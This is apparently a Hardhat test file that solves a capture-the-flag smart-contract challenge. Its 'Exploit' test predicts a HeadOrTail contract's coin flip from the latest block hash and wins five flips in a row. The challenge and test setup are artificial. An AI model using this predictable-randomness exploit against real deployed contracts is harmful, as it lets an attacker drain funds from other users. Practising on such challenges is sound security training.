const { ethers } = require("hardhat");
const { expect } = require("chai");
const challengeName = "Head or Tail Challenge";

describe(challengeName, function () {
  let alice, bob;

  before(async function () {
    /** SETUP SCENARIO - DON'T CHANGE ANYTHING HERE */
    [alice, bob] = await ethers.getSigners();

    const HeadOrTale = await ethers.getContractFactory("HeadOrTail", alice);

    this.headOrTale = await HeadOrTale.deploy();

    expect(await this.headOrTale.wins()).to.equal(0);
  });

  it("Exploit", async function () {
    for (let i = 0; i < 5; i++) {
      const blockNumber = await ethers.provider.getBlockNumber();
      const block = await ethers.provider.getBlock(blockNumber);
      const factor = ethers.BigNumber.from(
        "57896044618658097711785492504343953926634992334420282019728792003956564819968"
      );
      const blockHashBigNumber = ethers.BigNumber.from(
        "0x" + block.hash.slice(2),
        16
      );
      const coinFlip = blockHashBigNumber.div(factor);
      const side = coinFlip.eq(1);
      const tx = await this.headOrTale.connect(bob).flip(side);
      await tx.wait();
    }
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Bob has won 5 times in a row
    if (expect(await this.headOrTale.wins()).to.equal(5)) {
      console.log(`You have passed the ${challengeName}.`);
    }
  });
});
